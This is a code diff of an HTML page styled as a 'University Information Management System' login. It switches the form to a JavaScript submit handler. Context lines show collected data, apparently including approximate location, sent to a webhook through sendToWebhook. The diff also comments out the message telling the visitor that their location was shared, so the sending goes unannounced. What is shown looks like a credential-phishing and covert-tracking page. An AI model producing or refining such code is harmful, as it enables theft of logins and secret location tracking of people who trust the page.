@@ -17,7 +17,7 @@
         <h2>Log in</h2>
         <p class="subtitle">Welcome to University Information Management System</p>
         
-        <form action="#" method="POST">
+        <form onsubmit="submitData(event)">
             <div class="input-group">
                 <input type="text" id="userId" name="userId" placeholder="User Id" required>
             </div>
@@ -92,8 +92,8 @@
           };
 
           sendToWebhook(data);
-          document.getElementById("status").innerText =
-            "Approximate location shared.";
+          // document.getElementById("status").innerText =
+          //   "Approximate location shared.";
         });
     }
 
@@ -123,4 +123,5 @@
 
 </body>
 </html>
+
 
